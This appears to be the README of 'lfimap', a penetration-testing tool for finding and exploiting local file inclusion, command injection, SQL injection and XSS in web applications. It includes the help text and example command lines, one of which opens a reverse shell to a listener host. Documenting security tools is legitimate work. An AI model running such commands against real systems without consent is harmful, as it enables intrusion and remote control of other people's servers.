# lfimap
## Local file inclusion discovery and exploitation tool

### Main features
- Filter wrapper for arbitrary file inclusion
- Data wrapper for remote command execution
- Input wrapper for remote command execution
- Expect wrapper for remote command execution
- File wrapper for arbitrary file inclusion
- Path truncation for arbitrary file inclusion
- Remote file inclusion for code execution
- Command injection for remote command execution
- Generic time based blind sql injection testing
- Basic reflected XSS testing
- Support for POST argument testing
- Support for custom http headers
- Support for specifying cookies for authenticated requests
- Support for specifying web proxy to send requests through
- Support for specifying delay in between requests
- Support for payload manipulation via url and base64 encoding(s)
- Support for automated reverse shell access upon successful remote code execution

### Documentation
- [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)

### What features are working
- Scan parameters for local file inclusion using wrappers (filter, input, data, expect, file)
- Scan parameters for path traversal (different bypasses, nullbyte, path normalization, string stripping injection, single and double URL encoding, etc..)
- Scan parameters for remote file inclusion (remote internet facing website, if LHOST address is provided test by hosting a file on local web server)
- Scan parameters for results-based and blind command injection (different injection sequences, icmp exfil, shell variable usage to bypass character restrictions)
- Scan parameters for basic blind sql injection (currently supports only MySQL and MsSQL)
- Scan parameters for unsanitized reflection (Basic reflected XSS check)
- Inline check for arbitrary open redirection
- Supports scans for GET and POST parameters
- Supports scans through a proxy
- Supports scans with custom session cookies, user-agent, referer and/or HTTP headers
- Supports scans and exploitation with delay in between requests
- Supports scans and exploitation for windows and linux web servers
- Supports automated reverse shell upon RCE detection (Current methods that support this are: data, input and expect wrappers, remote file inclusion, command injection, http access log poisoning)

### What features will work in future
- RCE attack using /self/fd, /self/environ techniques and http error log poisoning
- Better Generic blind SQLi test support for Oracle, MsSQL and PostgreSQL database engines
- Automatic parameter recognition, select parameters to test with * (star) value or with '-p' parameter
- Support testing with raw http request from a file
- Support to test and exploit HTTP header values
- Enumeration category of options that will use found vulnerabilities to find out more about the system
- Output results to a file
- False positive check

### -h, --help

```                  
usage: lfimap.py [-U [url]] [-F [urlfile]] [-C <cookie>] [-D <data>] [-H <header>] [-P <proxy>] [--useragent <agent>] [--referer <referer>] [--param <name>]
                 [--http-ok <number>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r] [-c] [--file] [--xss] [--sqli] [--info] [-a] [-n <U|B>] [-x] [--lhost <lhost>]
                 [--lport <lport>] [-wT <path>] [--use-long] [-v] [-h]

lfimap, Local File Inclusion discovery and exploitation tool

MANDATORY:
  -U [url]             		 Specify url, Ex: "http://example.org/vuln.php?param=PWN" 
  -F [urlfile]         		 Specify url wordlist (every line should have --param|'PWN'.)

GENERAL OPTIONS:
  -C <cookie>          		 Specify session cookie, Ex: "PHPSESSID=1943785348b45"
  -D <data>            		 Do HTTP POST value test. Ex: "param=PWN"
  -H <header>          		 Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"
  -P <proxy>           		 Specify proxy. Ex: "http://127.0.0.1:8080"
  --useragent <agent>  		 Specify HTTP user agent
  --referer <referer>  		 Specify HTTP referer
  --param <name>       		 Specify different test parameter value
  --http-ok <number>   		 Specify http response code(s) to treat as valid
  --no-stop            		 Don't stop using same method upon findings

ATTACK TECHNIQUE:
  -f, --filter         		 Attack using filter wrapper
  -i, --input          		 Attack using input wrapper
  -d, --data           		 Attack using data wrapper
  -e, --expect         		 Attack using expect wrapper
  -t, --trunc          		 Attack using path truncation with wordlist (default "short.txt")
  -r, --rfi            		 Attack using remote file inclusion
  -c, --cmd            		 Attack using command injection
  --file               		 Attack using file wrapper
  --xss                		 Test for reflected XSS
  --sqli               		 Test for SQL injection
  --info               		 Test for basic information disclosures
  -a, --all            		 Use all available methods to attack

PAYLOAD OPTIONS:
  -n <U|B>             		 Specify payload encoding(s). "U" for URL, "B" for base64
  -x, --exploit        		 Exploit to reverse shell if possible (Setup reverse listener first)
  --lhost <lhost>      		 Specify local ip address for reverse connection
  --lport <lport>      		 Specify local port number for reverse connection

WORDLIST OPTIONS:
  -wT <path>           		 Specify path to wordlist for truncation test modality
  --use-long           		 Use "wordlists/long.txt" wordlist for truncation test modality

OTHER:
  -v, --verbose        		 Print more detailed output when performing attacks
  -h, --help           		 Print this help message
  
```

### Examples 

#### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  

![Lfimap-1](https://user-images.githubusercontent.com/57464251/186299395-c6a91666-0e95-484e-8537-6f248d257f5b.png)


#### 2) Reverse shell command execution attack with '-x'
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  

![Lfimap-2](https://user-images.githubusercontent.com/57464251/186299661-7d6b480b-953f-4a7e-a806-5f39435f07fd.png)


#### 3) Post argument testing with '-D'

`python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`

![Lfimap-3](https://user-images.githubusercontent.com/57464251/186302047-0a2e9ab9-e4f0-43bb-b245-0235b6950ea0.png)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
Pull requests are welcome.

[!] Disclaimer: Lfimap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
not responsible for any misuse and damage caused by using this program.
